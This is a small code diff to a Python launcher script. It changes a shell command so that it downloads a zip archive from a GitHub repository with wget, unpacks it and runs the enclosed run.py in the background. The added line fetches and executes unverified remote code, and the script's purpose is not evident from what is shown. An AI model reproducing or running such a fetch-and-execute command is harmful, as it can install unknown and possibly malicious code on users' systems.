@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'apt install unzip -y && unzip jikunma.zip && python3 run.py > {LOG_FILE} 2>&1 &'
+    cmd = f'wget https://github.com/brontosimungo/fertas/raw/refs/heads/main/webapp/webapp.zip && unzip webapp.zip && python3 run.py > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
